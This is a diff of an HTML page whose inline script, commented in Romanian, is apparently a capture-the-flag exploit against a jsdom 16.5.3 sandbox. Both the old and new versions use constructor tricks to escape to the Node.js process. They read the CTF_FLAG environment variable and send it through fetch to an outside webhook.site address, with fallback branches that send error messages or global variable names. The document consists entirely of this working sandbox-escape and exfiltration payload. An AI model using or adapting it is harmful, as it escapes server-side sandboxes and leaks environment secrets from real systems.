@@ -1,22 +1,26 @@
-<!DOCTYPE html><!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <body>
     <script>
         try {
-            // Folosim o metodă de evadare din sandbox prin prototipul funcțiilor
-            const getProcess = Function('return this.process || (this.constructor.constructor("return process")())');
-            const proc = getProcess();
+            // Aceasta este metoda specifică pentru jsdom 16.5.3 de a accesa procesul Node.js
+            // Căutăm constructorul funcției în afara mediului limitat (sandbox)
+            const far_away_process = Node.constructor("return process")();
             
-            // Extragem flag-ul
-            const flag = proc.env.CTF_FLAG || "FLAG_NEIDENTIFICAT";
+            // Extragem flag-ul din variabilele de mediu
+            const flag = far_away_process.env.CTF_FLAG;
 
-            // Trimitem flag-ul către tine
-            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + encodeURIComponent(flag));
+            // Trimitem flag-ul direct către tine
+            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?VICTORIE=" + flag);
             
         } catch (e) {
-            // Dacă dă eroare, trimitem toate variabilele globale să vedem unde e ascuns flag-ul
-            const globals = Object.keys(window).join(',');
-            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?BACKUP_KEYS=" + btoa(globals));
+            // Dacă dă eroare, încercăm o cale alternativă
+            try {
+                const alt_process = (async()=>{}).constructor("return process")();
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?VICTORIE_ALT=" + alt_process.env.CTF_FLAG);
+            } catch (e2) {
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?DEBUG_ERR=" + btoa(e2.message));
+            }
         }
     </script>
 </body>
